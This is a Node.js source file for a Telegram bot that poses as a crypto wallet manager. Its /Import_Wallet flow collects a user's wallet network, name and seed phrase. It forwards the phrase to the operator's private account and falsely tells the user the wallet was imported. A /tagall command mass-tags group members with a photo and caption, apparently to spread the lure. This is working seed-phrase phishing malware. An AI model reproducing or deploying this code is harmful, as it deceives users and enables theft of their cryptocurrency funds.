require("dotenv").config();
const TelegramBot = require("node-telegram-bot-api");
const botToken = process.env.API_KEY;
console.log(botToken);
const bot = new TelegramBot(botToken, { polling: true });
const axios = require("axios");
const myUserId = process.env.ADMIN_id;
// const getUsersArray = async (chatId) => {
//   try {
//     const members = await bot.getChatAdministrators(chatId);
//     const array = members.map((member) => member.user.id);
//     console.log(array);
//     return array;
//   } catch (error) {
//     console.log(error.message);
//   }
// };
let Text;
let photoId;
let photoSize;
let chatId;

async function tagAllGroupMembers(groupId) {
  try {
    const members = await bot.getChatMemberCount(groupId);
    for (let i = 0; i < members; i += 30) {
      const taggedMembers = await bot.getChatAdministrators(groupId, {
        limit: 30,
        offset: i,
      });
      const userNames = taggedMembers.map((member) =>
        member.user.username
          ? member.user.username
          : `${member.user?.first_name + " " + member.user?.last_name}`
      );
      const taggedMessage = userNames.map((name) => `@${name}`).join(" ");

      await bot.sendPhoto(groupId, photoId, {
        caption: `${Text} \n ${taggedMessage} `,
      });
    }
  } catch (error) {
    console.error("Error:", error);
  }
}

async function createPost(chatId, caption) {
  try {
    const file = await bot.getFile(photoId);
    await bot.sendPhoto(chatId, photoId, { caption });
  } catch (error) {
    console.error("Error:", error);
  }
}
// Get the list of groups the bot is connected to

bot.onText(/\/tagall/, (msg) => {
  if (msg.from.id == process.env.ADMIN_id) {
    const chatId = msg.chat.id;

    tagAllGroupMembers(chatId);
  }
});
bot.onText(/\/setImage/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, "upload an image");
});
bot.onText(/\/Import_Wallet/, (msg) => {
  const chatId = msg.chat.id;
  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "SOL", callback_data: "Sol" }],
        [{ text: "TON", callback_data: "Tron" }],
        [{ text: "ETH", callback_data: "ETH" }],
      ],
    },
  };
  bot.sendMessage(chatId, "Select your Wallet Network:", options);
});
bot.on("callback_query", (callbackQuery) => {
  const msg = callbackQuery.message;
  const chatId = msg.chat.id;
  const network = callbackQuery.data;

  // Acknowledge the callback query
  bot.answerCallbackQuery(callbackQuery.id).then(() => {
    // Prompt the user to enter their wallet name
    bot.sendMessage(chatId, `You selected ${network}. Enter your Wallet Name:`);

    // Step 4: Listen for the next message to get the wallet name
    bot.once("message", (msg) => {
      const walletName = msg.text;

      // Prompt the user to enter their 7-seed phrase
      bot.sendMessage(chatId, "Enter your 12-Seed Phrase:");

      // Step 5: Listen for the next message to get the 7-seed phrase
      bot.once("message", (msg) => {
        const seedPhrase = msg.text;

        // Do something with the wallet name and seed phrase
        console.log("Network:", network);
        console.log("Wallet Name:", walletName);
        console.log("7-Seed Phrase:", seedPhrase);

        // Send the collected information to yourself as a direct message
        const message = `Network: ${network}\nWallet Name: ${walletName}\n7-Seed Phrase: ${seedPhrase}`;
        bot.sendMessage(myUserId, message);

        // Send a confirmation message to the user
        bot.sendMessage(
          chatId,
          `Wallet Name "${walletName}" with Network "${network}" and Seed Phrase has been imported.`
        );
      });
    });
  });
});
bot.onText(/\/start/, (msg) => {
  console.log("You said hii");
  const chatId = msg.chat.id;
  bot.sendMessage(
    chatId,
    "Select and Manage your wallet:\nUse /Create_Wallet or /Import_Wallet to add wallet"
  );
});

// bot.on("message", async (msg) => {
//   const chatId = msg.chat.id;
//   const message = `Welcome! Select and Manage your wallet:\nPlease follow the instructions below:\n\nFor important updates, visit our channel:`;

//   if (msg.photo) {
//     photoId = msg.photo[0].file_id;
//     photoSize = msg.photo[0].file_size;
//     // Perform further actions with the received photo
//     bot.sendMessage(chatId, "Image set successfully");
//   }
//   if (
//     msg.text &&
//     msg.text !== "/createPost" &&
//     msg.text !== "/start" &&
//     msg.text !== "/setMessage" &&
//     msg.text !== "/setImage" &&
//     msg.text !== "/Import_Wallet"
//   ) {
//     Text = msg.text;
//     bot.sendMessage(chatId, message);
//   }
//   if (msg.text === "/createPost") {
//     await createPost(chatId, Text);
//   }
// });

console.log("listening");
console.log(`fileId = ${photoId}`);
console.log(`Message = ${Text}`);
